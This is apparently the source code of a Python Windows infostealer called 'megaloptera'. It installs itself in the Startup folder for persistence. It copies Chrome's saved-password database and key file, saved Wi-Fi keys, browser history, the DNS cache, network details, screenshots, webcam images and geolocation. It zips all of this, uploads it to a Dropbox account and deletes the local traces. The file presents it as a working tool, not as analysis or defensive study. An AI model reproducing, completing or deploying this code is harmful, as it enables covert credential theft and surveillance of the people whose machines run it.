from ecapture import ecapture as ec
from mss import mss
from zipfile import ZipFile
from requests import get
import time
import shutil
import sys 
import os
import browserhistory as bh   
import subprocess
import requests
import dropbox

#V.0.0.8

def evasion():
    access_token = 'YOUR API KEY HERE'

    dbx = dropbox.Dropbox(access_token)

    local_file_path = 'windows.zip'

    destination_path = '/mega loptera/windows.zip'

    with open(local_file_path, 'rb') as f:
        dbx.files_upload(f.read(), destination_path)

    os.remove("windows.zip")
    password()


c_locate_folder = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
p_locate_folder = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%(os.environ['USERPROFILE']))
destination_folder = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data \Default \Cache"%(os.environ['USERPROFILE']))

auto_run_path = os.path.normpath(r"%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"%(os.environ['USERPROFILE']))

def auto_run():
    shutil.move("megaloptera.py", auto_run_path)
    password()

def convert_file():
    files = ZipFile('windows.zip', 'w')
    files.write('location.txt')
    files.write('screenshots.jpg') 
    files.write('outputImage.jpg') 
    files.write('test_ip.txt') 
    files.write('output.txt')
    files.write('crypt.txt')
    files.write('password.txt')
    files.write("browser.txt")
    files.write("wifi-password.txt")
    files.write("dns.txt")
    os.remove("screenshots.jpg")
    os.remove('location.txt')
    os.remove("outputImage.jpg")
    os.remove("test_ip.txt")
    os.remove("output.txt")
    os.remove('crypt.txt')
    os.remove("dns.txt")
    os.remove('password.txt')
    os.remove("browser.txt")
    os.remove("wifi-password.txt")
    files.close() 
    evasion()

def ip():
    try:
        ip = get(f'https://api.ipify.org/?format=json')
        os.system("ipconfig /all > output.txt")
        file_ip = open("test_ip.txt", "w", encoding='utf-8')
        file_ip.write(str(ip.json()))
        file_ip.close()
    except:
        pass
    
    screenshots()
def webcam():
    try:
        ec.capture(0,"frame", "outputImage.jpg") 
    except:
        pass
    browser()

def screenshots():
    output_file = 'screenshots.jpg'
    with mss() as sct:
        sct.shot( output=output_file)
    webcam()

def password():
    try:
        with open(c_locate_folder, 'r') as file:
            data = file.read().rstrip('\n') 
        with open(r"crypt.txt","w" ,encoding = 'utf-8') as p:
            p.write(data)
            
            file.close()
            p.close()

        with open(p_locate_folder,'r', encoding="utf8",  errors="ignore") as text:
            crypt = text.read().rstrip('\n')
            with open(r"password.txt", 'w',encoding="utf-8" ,errors="ignore") as f:
                f.write(crypt)
                
                text.close()
                f.close()
    except:
        pass
    
    ip()

def location():
    try:
        geoloc = get(f'http://ip-api.com/json')
        file = open('location.txt', 'w', encoding='utf-8')
        file.write(str(geoloc.json()))
        file.close()
    except:
        pass    
    convert_file()


def wifi_password(): 
    with open('wifi-password.txt', 'a') as wifile:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "Profil Tous les utilisateurs" in i]

        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Contenu de la cl" in b]
                try:
                    value = str("{:<30}| {:<}".format(i, results[0]))
                    wifile.write(value)
                    wifile.write('\n')
                except IndexError:
                    pass
            except subprocess.CalledProcessError:
                pass
    location()
        
def browser():
    try:
        browser_history = []
        bh_user = bh.get_username()
        db_path = bh.get_database_paths()
        hist = bh.get_browserhistory()
        browser_history.extend((bh_user, db_path, hist))
        with open( 'browser.txt', 'a') as browser_txt:
            browser_txt.write(str(browser_history))
        os.system("ipconfig/displaydns > dns.txt")

    except:
        pass
        
    wifi_password()
auto_run()
